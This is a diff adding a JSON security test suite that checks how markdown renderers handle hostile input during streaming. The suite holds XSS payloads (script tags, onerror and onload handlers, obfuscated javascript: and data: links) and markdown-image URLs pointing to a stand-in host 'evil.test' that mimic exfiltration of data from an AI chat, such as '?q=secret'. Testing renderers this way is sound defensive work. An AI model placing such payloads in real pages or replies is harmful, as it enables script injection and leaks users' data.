@@ -1,0 +1,188 @@
+[
+  {
+    "id": "p1-raw-html",
+    "title": "Raw HTML that runs script",
+    "diagnostic": false,
+    "sources": [
+      "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+      "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
+    ],
+    "oracle": "pass: nothing ran, no on* attribute and no active element (script, iframe, object, embed, form, style, meta, svg, math, base, link) appeared in the output at any step. partial: nothing ran, but such an element or attribute is in the DOM. fail: a payload called the sentinel, or a dialog opened. Elements the library draws as its own chrome are subtracted with a plain-text control run.",
+    "payloads": [
+      {
+        "id": "control",
+        "markdown": "plain words"
+      },
+      {
+        "id": "p1-script",
+        "markdown": "<script>__pwn('p1-script')</script>"
+      },
+      {
+        "id": "p1-img",
+        "markdown": "<img src=x onerror=\"__pwn('p1-img')\">"
+      },
+      {
+        "id": "p1-img-inline",
+        "markdown": "a <img src=x onerror=\"__pwn('p1-inline')\"> b"
+      },
+      {
+        "id": "p1-svg",
+        "markdown": "<svg onload=\"__pwn('p1-svg')\">"
+      },
+      {
+        "id": "p1-iframe",
+        "markdown": "<iframe srcdoc=\"<script>parent.__pwn('p1-iframe')</script>\">"
+      }
+    ]
+  },
+  {
+    "id": "p2-link-schemes",
+    "title": "Dangerous link schemes",
+    "diagnostic": false,
+    "sources": [
+      "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+      "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
+    ],
+    "oracle": "Static scan of every resolved a.href protocol at every step, plus a real click on every link after the stream ends (target removed first). pass: all inert. partial: no javascript: link, but a data: or vbscript: href was kept. fail: a javascript: href exists, or a click ran script. A javascript: href that React replaced by its throwing stub counts as blocked.",
+    "payloads": [
+      {
+        "id": "p2-js",
+        "markdown": "[x](javascript:__pwn('p2-js'))"
+      },
+      {
+        "id": "p2-js-enc",
+        "markdown": "[x](javascript:__pwn%28%27p2-js-enc%27%29)"
+      },
+      {
+        "id": "p2-case",
+        "markdown": "[x](JaVaScRiPt:__pwn%28%27p2-case%27%29)"
+      },
+      {
+        "id": "p2-tab",
+        "markdown": "[x](java&#x09;script:__pwn%28%27p2-tab%27%29)"
+      },
+      {
+        "id": "p2-vb",
+        "markdown": "[x](vbscript:msgbox(1))"
+      },
+      {
+        "id": "p2-data",
+        "markdown": "[x](data:text/html,<script>__pwn('p2-data')</script>)"
+      },
+      {
+        "id": "p2-auto",
+        "markdown": "<javascript:__pwn('p2-auto')>"
+      }
+    ]
+  },
+  {
+    "id": "p3-remote-html",
+    "title": "Remote request from raw HTML",
+    "diagnostic": false,
+    "sources": [
+      "https://embracethered.com/blog/posts/2023/bing-chat-data-exfiltration-poc-and-fix/",
+      "https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/"
+    ],
+    "oracle": "pass: no request left the page without a click. fail: any request to evil.test, at any step.",
+    "payloads": [
+      {
+        "id": "p3-block",
+        "markdown": "<img src=\"https://evil.test/p3\">"
+      },
+      {
+        "id": "p3-inline",
+        "markdown": "a <img src=\"https://evil.test/p3i\"> b"
+      }
+    ]
+  },
+  {
+    "id": "p4-remote-md-image",
+    "title": "Remote request from a markdown image",
+    "diagnostic": false,
+    "sources": [
+      "https://embracethered.com/blog/posts/2023/bing-chat-data-exfiltration-poc-and-fix/",
+      "https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/"
+    ],
+    "oracle": "pass: no request without a click (nothing rendered, or a click-to-load placeholder). fail: any request to evil.test, at any step (a half-typed URL counts).",
+    "payloads": [
+      {
+        "id": "p4-img",
+        "markdown": "![x](https://evil.test/leak?q=secret)"
+      }
+    ]
+  },
+  {
+    "id": "p5-link-target",
+    "title": "Link target and rel",
+    "diagnostic": true,
+    "sources": [
+      "https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Attributes/rel/noopener"
+    ],
+    "oracle": "Diagnostic only. pass: the link has no target, or target=_blank with noopener. partial: target=_blank without rel noopener. Streamdown draws links as buttons, which has no anchor to inspect.",
+    "payloads": [
+      {
+        "id": "p5-link",
+        "markdown": "[x](https://ok.test/)"
+      }
+    ]
+  },
+  {
+    "id": "p6-markers",
+    "title": "Raw markdown markers while streaming",
+    "diagnostic": false,
+    "sources": [],
+    "oracle": "Ten short documents, one construct each, written with letters only, so the final text contains none of * _ ` ~ # [ ] | > -. Each is streamed one character at a time. A construct leaks if any of those characters is in the container text after any write. A construct whose final text still has a marker was not rendered by the library at all, and counts as n/a, not as a leak. pass: 0 leaks. partial: 1 to 3. fail: 4 or more. The thresholds are provisional, the raw counts are the result. Marked and react-markdown are not streaming-aware, so the result says how they behave when used as documented.",
+    "payloads": [
+      {
+        "id": "emphasis",
+        "markdown": "some *quiet words* here"
+      },
+      {
+        "id": "strong",
+        "markdown": "some **loud words** here"
+      },
+      {
+        "id": "code span",
+        "markdown": "run `code span` now"
+      },
+      {
+        "id": "fenced code",
+        "markdown": "```\nfenced code\n```\n"
+      },
+      {
+        "id": "heading",
+        "markdown": "# Big heading\n"
+      },
+      {
+        "id": "link",
+        "markdown": "see [the link](https://ok.test/page) now"
+      },
+      {
+        "id": "list",
+        "markdown": "- first item\n- second item\n"
+      },
+      {
+        "id": "blockquote",
+        "markdown": "> quoted words here\n"
+      },
+      {
+        "id": "table",
+        "markdown": "| left | right |\n| --- | --- |\n| one | two |\n"
+      },
+      {
+        "id": "strikethrough",
+        "markdown": "some ~~struck words~~ here"
+      }
+    ]
+  },
+  {
+    "id": "p7-commonmark",
+    "title": "CommonMark 0.31.2 conformance",
+    "diagnostic": false,
+    "sources": [
+      "https://spec.commonmark.org/0.31.2/",
+      "https://spec.commonmark.org/0.31.2/spec.json"
+    ],
+    "oracle": "All 652 examples of the spec, each written in one write, ended, and compared with the expected HTML after the same lenient normaliser for every library (tag structure plus whitespace-collapsed text, attributes ignored). Library-specific normaliser rules are listed in canon.mjs. The denominator is 652 for every library. Also recorded: a strict count (serialised HTML equal with whitespace between tags removed) and a text-only count. Informational, not a pass or fail."
+  }
+]
